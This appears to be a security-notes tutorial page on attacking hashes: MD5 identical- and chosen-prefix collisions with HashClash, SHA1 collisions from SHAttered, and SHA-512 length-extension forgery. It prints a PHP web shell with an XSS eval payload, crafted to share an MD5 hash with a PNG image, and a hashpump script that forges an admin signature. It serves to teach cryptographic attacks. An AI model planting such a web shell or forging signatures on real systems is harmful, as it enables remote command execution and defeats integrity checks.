---
description: One-way functions that generate a unique hash of some data
---

# Hashing

{% hint style="warning" %}
Note: This chapter is about attacking hashes in a cryptographic way. For information about brute-force **cracking** hashes of passwords, for example, see [cracking-hashes.md](cracking-hashes.md "mention")
{% endhint %}

## Collisions

Collisions in hashing functions mean two different inputs result in the same hash. In a perfect hash function, this should not be possible, or at least infeasible. There are a few types of collisions with varying exploitability:

* **Identical Prefix**: The prefix of two files are the same, then there are a few collision blocks with different data\
  ![](<../../.gitbook/assets/image (20) (1).png>)
* **Chosen Prefix**: The prefix of the two files can be anything you want, and may differ. Then after there are some collision blocks, and finally it ends in an identical suffix\
  ![](<../../.gitbook/assets/image (34).png>)

For lots of details on how these attacks work and how to exploit them see the following GitHub repository:

{% embed url="https://github.com/corkami/collisions" %}

### MD5 - Identical Prefix

When looking at collisions MD5 is very broken. Nowadays it's trivial to create your own Identical Prefix attack within minutes. We can use a tool like HashClash with very efficient code to do the work for us:

{% embed url="https://github.com/cr-marcstevens/hashclash" %}
HashClash is a toolset allowing you to make your own hash collisions
{% endembed %}

With MD5 you can create any identical blocks consisting of 64 bytes as the prefix, then two collision blocks that differ, and finally any identical suffix.&#x20;

An example of two files you could create with this is the following:

{% file src="../../.gitbook/assets/collision1_extra.bin" %}
First file with 3630 and 93fe in collision blocks
{% endfile %}

{% file src="../../.gitbook/assets/collision2_extra.bin" %}
Second file with 3631 and 93fd in collision blocks
{% endfile %}

{% code title="Difference between collisions" %}
```html
collision1_extra.bin                              collision2_extra.bin
000: 4141 4141 4141 4141  4141 4141 4141 4141  |  4141 4141 4141 4141  4141 4141 4141 4141
...
0b0: 4343 4343 4343 4343  4343 4343 4343 4343  |  4343 4343 4343 4343  4343 4343 4343 4343
0c0: 7465 7374 54ea 9808<!3630>b09d 3d43 6180  |  7465 7374 54ea 9808<!3631>b09d 3d43 6180
0d0: b422 b9a7 5623 4eb5  f058 193f 3bb0 1a42  |  b422 b9a7 5623 4eb5  f058 193f 3bb0 1a42
0e0: c07e 6126 3822 d79a  48f1 e021 06bb 79b9  |  c07e 6126 3822 d79a  48f1 e021 06bb 79b9
0f0: caac ddbd d237 ee6e  6cfd ea0c 388c 089f  |  caac ddbd d237 ee6e  6cfd ea0c 388c 089f
100: 9af5 2e5f f819 769d<!93fe>52ab 6c09 278d  |  9af5 2e5f f819 769d<!93fd>52ab 6c09 278d
110: 8a95 8786 b562 bbf7  669e 1a6f 45de 5859  |  8a95 8786 b562 bbf7  669e 1a6f 45de 5859
120: d534 15f5 e8fb 559e  3969 1590 1e22 f779  |  d534 15f5 e8fb 559e  3969 1590 1e22 f779
130: 787e 315b f744 94d6  e53d a228 8fd0 6678  |  787e 315b f744 94d6  e53d a228 8fd0 6678
140: 4444 4444 4444 4444  4444 4444 4444 4444  |  4444 4444 4444 4444  4444 4444 4444 4444
...
1f0: 4646 4646 4646 4646  4646 4646 4646 4646  |  4646 4646 4646 4646  4646 4646 4646 4646
```
{% endcode %}

To create such a file you can use the [poc\_no.sh](https://github.com/cr-marcstevens/hashclash/blob/master/scripts/poc\_no.sh) script from the HashClash repository. It takes one argument which is the prefix for the collision. It can contain:

* Any exact multiple of 64 bytes, as the identical prefix
* A multiple of 4 bytes, with a maximum of 12 bytes in total. These will be the starting bytes for the collision blocks

In the example above I used a file containing `"A"*64 + "B"*64 + "C"*64 + "test"` as the prefix. This will make sure the identical prefix starts with AAA...CCC and the collision blocks start with "test". \
Then after this, I added `"D"*64 + "E"*64 + "F"*64` to the generated collisions because any data after will only change the hash, but the collision will remain.&#x20;

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ python3 -c 'print("A"*64 + "B"*64 + "C"*64 + "test", end="")' > prefix  # Create prefix
</strong><strong>$ ../scripts/poc_no.sh prefix  # Do collision (takes a few minutes)
</strong>...
<strong>$ md5sum collision*.bin  # MD5 sums are the same
</strong>a83232a6730cdd6102d002e31ffd1c3f  collision1.bin
a83232a6730cdd6102d002e31ffd1c3f  collision2.bin
# # Append data to collisions
<strong>$ cat collision1.bin &#x3C;(python3 -c 'print("D"*64 + "E"*64 + "F"*64, end="")') > collision1_extra.bin
</strong><strong>$ cat collision2.bin &#x3C;(python3 -c 'print("D"*64 + "E"*64 + "F"*64, end="")') > collision2_extra.bin
</strong><strong>$ md5sum collision*_extra.bin  # MD5 sums still match
</strong>e8842904b573ed3cd545a5b116f70af8  collision1_extra.bin
e8842904b573ed3cd545a5b116f70af8  collision2_extra.bin
</code></pre>

### MD5 - Chosen Prefix

The chosen prefix attack is a lot more powerful but also takes quite a bit longer to compute. It takes about one day to do one collision between files, depending on your computer.&#x20;

With such a collision you could make two completely different files have the same md5 sum, only having a few collision blocks at the end, and allowing an identical suffix.&#x20;

To create a collision like this, you could use the [cpc.sh](https://github.com/cr-marcstevens/hashclash/blob/master/scripts/cpc.sh) script from HashClash. It takes two different prefix files as input and creates two files with those prefixes and some collisions block appended. Then you can manually add an identical suffix to it later because the collision will remain.

I've let a VPS with 24 cores run for 1.5 days to find a chosen-prefix collision like this. I chose one prefix of a simple 256x256 png image, and the other prefix to be an XSS and PHP shell payload. So I could leave the terminal and look back at it later I used the `screen` command to start a session, and used `screen -r` every once in a while to check back into it. Another way would be to redirect the output to some log file to check.&#x20;

```shell-session
# # From hashclash clone (and build)
$ mkdir workdir && cd workdir
$ ../scripts/cpc.sh 256.png prefix.php  # Takes a long time
```

The cpc.sh script will then find a collision by appending collision blocks to both prefixes, which is why I added a `<!--` comment tag to the shell, and I made sure to add the `IEND` and CRC to the PNG image to signify the end of the PNG. Some tools like [`pngcheck`](http://www.libpng.org/pub/png/apps/pngcheck.html) complain about data after the `IEND`, but all other things I've tried parse the PNG completely fine. Here are the original prefixes:

{% code title="256.png (156 bytes)" %}
```python
┌────────┬─────────────────────────┬─────────────────────────┬────────┬────────┐
│00000000│ 89 50 4e 47 0d 0a 1a 0a ┊ 00 00 00 0d 49 48 44 52 │×PNG__•_┊000_IHDR│
│00000010│ 00 00 01 00 00 00 01 00 ┊ 08 03 00 00 00 6b ac 58 │00•000•0┊••000k×X│
│00000020│ 54 00 00 00 03 50 4c 54 ┊ 45 ac c8 f2 27 88 57 a8 │T000•PLT┊E×××'×W×│
│00000030│ 00 00 00 54 49 44 41 54 ┊ 78 9c ed c1 01 01 00 00 │000TIDAT┊x×××••00│
│00000040│ 00 80 90 fe af ee 08 0a ┊ 00 00 00 00 00 00 00 00 │0×××××•_┊00000000│
│00000050│ 00 00 00 00 00 00 00 00 ┊ 00 00 00 00 00 00 00 00 │00000000┊00000000│
│*       │                         ┊                         │        ┊        │
│00000080│ 00 00 00 00 00 00 00 18 ┊ 01 0f 00 01 4d f6 ca 06 │0000000•┊••0•M××•│
│00000090│ 00 00 00 00 49 45 4e 44 ┊ ae 42 60 82             │0000IEND┊×B`×    │
└────────┴─────────────────────────┴─────────────────────────┴────────┴────────┘
```
{% endcode %}

{% code title="shell.php (156 bytes)" %}
```php
<script>eval(location.hash.substring(1)||"alert(document.domain)")</script>
<pre><code>
<?php
system($_GET["cmd"]);
// PoC by J0R1AN
?>
</code></pre>
<!--
```
{% endcode %}

Then after the collision, there were 9 blocks of 64 bytes added. You can see the raw collision files below:

{% file src="../../.gitbook/assets/256.coll.png" %}
256x256 PNG image with md5: 365010576ad9921c55940b36b9d3e0ca
{% endfile %}

{% file src="../../.gitbook/assets/shell.coll.php" %}
An XSS and PHP shell with md5: 365010576ad9921c55940b36b9d3e0ca
{% endfile %}

### SHA1

Google Research has found an identical prefix collision in the SHA1 hashing algorithm, and so far is the only one to do so. It still takes 110 years of single-GPU computations to compute a collision yourself, so the only practical way right now is to use the prefix from Google.&#x20;

{% embed url="https://shattered.io/" %}
Website from Google Research going over the details of this SHA1 collision
{% endembed %}

SHA1 works by splitting the input into blocks of 512 bits (64 bytes). For every block, it does its operations, and if the two blocks are the same, the two outputs of that block are the same. It keeps going taking the previous block and continuing on it with the next block.&#x20;

A collision in SHA1 means that there were 2 sets of 5 blocks (320 bytes) found, that when SHA1 hashed give the same hash, while actually being different.&#x20;

Because of the way SHA1 works, we can start off by using the first 5 blocks from SHAttered, and then if the rest of the files have identical content, their hashes will be the same.&#x20;

To get different behavior from the two files, a common idea is to check if a certain byte that is different in the collision blocks. This way both files contain both pieces of code, but only one is chosen in both.&#x20;

```python
if data[102] == 115:
    # Do one thing
else:
    # Do something else
```

In HTML, this can be done by looking at the `innerHTML` with `charCodeAt(102)` in JavaScript. For a simple example see:

1. [https://arw.me/f/1.html](https://arw.me/f/1.html)
2. [https://arw.me/f/2.html](https://arw.me/f/2.html)

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ wget https://arw.me/f/1.html &#x26;&#x26; wget https://arw.me/f/2.html
</strong><strong>$ sha1sum 1.html 2.html  # SHA1 collision
</strong>ba97502d759d58f91ed212d7c981e0cfdfb70eef  1.html
ba97502d759d58f91ed212d7c981e0cfdfb70eef  2.html
<strong>$ sha256sum 1.html 2.html  # SHA256 does not
</strong>4477a514fa5e948d69e064a4e00378c69262e32e36c079b76226ae50e3d312cf  1.html
71c484897c7af6cb34cffa8f7c12dc3bf7fc834ed7f57123e21258d2f3fc4ba6  2.html
</code></pre>

## Length-extension Attack

Hashing algorithms are sometimes used for verifying messages. This can be done by appending a secret "salt" value in front of the data that only the server knows. If the server then generates a hash of this value, it is the only party that is able to do so. If you don't have the salt value you cannot generate a hash that starts with that salt.&#x20;

But the length-extension attack makes this semi-possible. It allows you to add data to an existing hash, with the catch that there will be some data prepended to your addition.&#x20;

Hashing functions like SHA256 or SHA512 might sound secure, but without proper precautions to this attack, they may be vulnerable to it. The following hashing algorithms are all vulnerable to this attack:

* MD4
* MD5
* RIPEMD-160
* SHA-0
* SHA-1
* SHA-256
* SHA-512
* WHIRLPOOL

To see an example of this attack look at the script below:

```python
import hashlib
import os
from hashpumpy import hashpump

SALT = os.urandom(42)  # Secret

def check_signature(data, signature):
    if hashlib.sha512(SALT + data).hexdigest() == signature:
        return True

def create_sample_signature():
    data = b"name=j0r1an&admin=false"
    signature = hashlib.sha512(SALT + data).hexdigest()

    return data, signature


# Get sample
original_data, original_sig = create_sample_signature()
print(original_data, original_sig)
print("Sample:", check_signature(original_data, original_sig))

# Attack
data_to_add = b"&admin=true"
salt_length = 42  # Can be brute-forced by trying multiple values

forged_sig, forged_data = hashpump(original_sig, original_data, data_to_add, salt_length)
print(forged_data, forged_sig)
print("Attack:", check_signature(forged_data, forged_sig))
# b'name=j0r1an&admin=false\x80\x00\x00...\x00\x00\x00\x02\x08&admin=true'
```

I also made a writeup of a challenge that uses this attack to perform SQL Injection:

{% embed url="https://jorianwoltjer.com/blog/post/ctf/cyber-santa-is-coming-to-town-2021/warehouse-maintenance" %}
A writeup of a challenge using the length-extension attack on SHA512 to perform SQL Injection
{% endembed %}
